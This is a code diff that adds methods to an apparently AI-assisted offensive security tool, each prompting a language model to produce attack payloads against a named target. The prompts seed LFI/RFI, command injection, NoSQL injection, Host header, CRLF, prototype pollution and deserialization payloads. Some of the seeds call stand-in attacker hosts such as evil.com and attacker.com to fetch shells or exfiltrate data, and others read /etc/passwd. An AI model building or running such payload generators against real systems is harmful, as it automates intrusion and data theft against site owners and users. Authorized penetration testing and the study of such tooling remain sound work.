@@ -306,6 +306,148 @@ Highlight:
 Be concise and actionable."""
         return self._call(prompt, temperature=0.2, max_tokens=600)
 
+    def generate_lfi_payloads(self, target, tech_stack=None):
+        tech = ", ".join(tech_stack) if tech_stack else "unknown"
+        prompt = f"""Target: {target}
+Tech: {tech}
+
+Generate 20 LFI (Local File Inclusion) and RFI (Remote File Inclusion) payloads.
+Include:
+- Path traversal with depth variations: ../../../etc/passwd
+- PHP wrappers: php://filter, php://input, data://
+- Null byte injection (for old PHP): /etc/passwd%00
+- RFI with remote URLs: http://evil.com/shell.txt?
+- /proc/self/environ, /proc/self/fd/*
+- Windows paths: C:\\boot.ini, ..\\..\\windows\\system32\\drivers\\etc\\hosts
+- Log poisoning paths: /var/log/apache2/access.log
+- Expect wrapper: expect://id
+
+Return ONLY one payload per line. No numbering. No explanations."""
+        resp = self._call(prompt, temperature=0.3, max_tokens=800)
+        return self._parse_list(resp)
+
+    def generate_cmd_injection_payloads(self, param_name, tech_stack=None):
+        tech = ", ".join(tech_stack) if tech_stack else "unknown"
+        prompt = f"""Parameter: {param_name}
+Tech: {tech}
+
+Generate 15 command injection payloads for this parameter.
+Include:
+- Basic: ; id, | whoami, `id`
+- Blind/time-based: ; ping -c 5 127.0.0.1, | sleep 5
+- Out-of-band: ; nslookup attacker.com, | curl http://evil.com
+- Subshell: $(whoami), $(sleep 5)
+- Newline: %0A id
+- No-space bypass: {chr(36)}{chr(7)}~{chr(36)}BASH
+- WAF bypass: /???/???t/c?t /???/p?ss?d
+
+Return ONLY one payload per line. No numbering. No explanations."""
+        resp = self._call(prompt, temperature=0.3, max_tokens=700)
+        return self._parse_list(resp)
+
+    def generate_nosql_payloads(self, param_name, db_type="mongodb"):
+        prompt = f"""Parameter: {param_name}
+Database: {db_type}
+
+Generate 12 NoSQL injection payloads for {db_type}.
+Include:
+- MongoDB: $ne, $gt, $regex, $where, JSON body injection
+- True conditions: ' || '1'=='1, ' || true || '
+- Blind: {chr(123)}$where: "sleep(5000)"{chr(125)}
+- $regex for blind extraction: ?param[$regex]=^a
+
+Return ONLY one payload per line. No numbering. No explanations."""
+        resp = self._call(prompt, temperature=0.3, max_tokens=600)
+        return self._parse_list(resp)
+
+    def generate_host_header_payloads(self, domain):
+        prompt = f"""Domain: {domain}
+
+Generate 12 Host header injection payloads for {domain}.
+Include:
+- Different domain: evil.com
+- X-Forwarded-Host injection
+- Multiple Host headers (HTTP/1.1 request smuggling)
+- Port injection: example.com:9999
+- Subdomain confusion: evil.example.com
+- Line feed injection (CRLF via Host)
+- Absolute URL in Host
+- IP instead of domain
+
+Return ONLY the host header value per line. No numbering. No explanations."""
+        resp = self._call(prompt, temperature=0.3, max_tokens=600)
+        return self._parse_list(resp)
+
+    def generate_crlf_payloads(self, context_hint="parameter"):
+        prompt = f"""Context: injection in {context_hint}
+
+Generate 12 CRLF (HTTP Response Splitting) injection payloads.
+Include:
+- Basic: %0d%0aSet-Cookie:malicious=value
+- %0a only (LF) variants
+- %0d only (CR) variants
+- Double encoding: %250d%250a
+- Unicode: %u000d%u000a
+- XSS via CRLF: %0d%0a<script>alert(1)</script>
+- Header injection: %0d%0aLocation: http://evil.com
+
+Return ONLY one payload per line. No numbering. No explanations."""
+        resp = self._call(prompt, temperature=0.3, max_tokens=600)
+        return self._parse_list(resp)
+
+    def generate_prototype_pollution_payloads(self, framework="express"):
+        prompt = f"""Framework: {framework}
+
+Generate 10 server-side prototype pollution payloads for Node.js/{framework}.
+Include:
+- __proto__ pollution via JSON body: {{"__proto__": {{"isAdmin": true}}}}
+- constructor.prototype: {{"constructor": {{"prototype": {{"polluted": true}}}}}}
+- Nested pollution
+- Array-based pollution
+- Header-based pollution
+- Query string pollution: ?__proto__.isAdmin=true
+- Middleware-specific vectors for {framework}
+
+Return ONLY one payload per line (as JSON or query string). No numbering. No explanations."""
+        resp = self._call(prompt, temperature=0.3, max_tokens=600)
+        return self._parse_list(resp)
+
+    def generate_deserialization_payloads(self, language="php"):
+        prompt = f"""Language: {language}
+
+Generate 12 insecure deserialization payload snippets for {language}.
+Include:
+- PHP: O:7:"Example":1:{{s:3:"cmd";s:6:"whoami";}}
+- Python pickle: cos\\nsystem\\n(S'whoami'\\ntR.
+- Java: Runtime.exec gadgets (ysoserial-style)
+- Ruby YAML: --- !ruby/object:Shell
+- .NET: PowerShell-based deserialization
+- Node.js: node-serialize payloads
+
+Return ONLY one payload per line. Use escaped strings where needed. No explanations."""
+        resp = self._call(prompt, temperature=0.3, max_tokens=800)
+        return self._parse_list(resp)
+
+    def generate_wordlist_entries(self, target, tech_stack=None, page_content=None):
+        tech = ", ".join(tech_stack) if tech_stack else "unknown"
+        content_sample = (page_content[:2000] + "...") if page_content else "no content available"
+        prompt = f"""Target: {target}
+Tech: {tech}
+Page content sample: {content_sample}
+
+Generate 30 potential directory/file/parameter names for a custom wordlist for this target.
+Include:
+- Framework-specific paths and endpoints
+- Common admin/API paths for the detected tech
+- Parameter names likely used by the application
+- File names (.env, config, backup) specific to the tech
+- Subdomain name ideas based on the brand/domain
+- Endpoint names based on page content patterns
+
+Return ONLY one word per line. Single words or single path components (no full paths). No explanations."""
+        resp = self._call(prompt, temperature=0.2, max_tokens=800)
+        return self._parse_list(resp)
+
     def analyze_shodan_host(self, host_data):
         summary = {
             "ip": host_data.get("ip_str"),
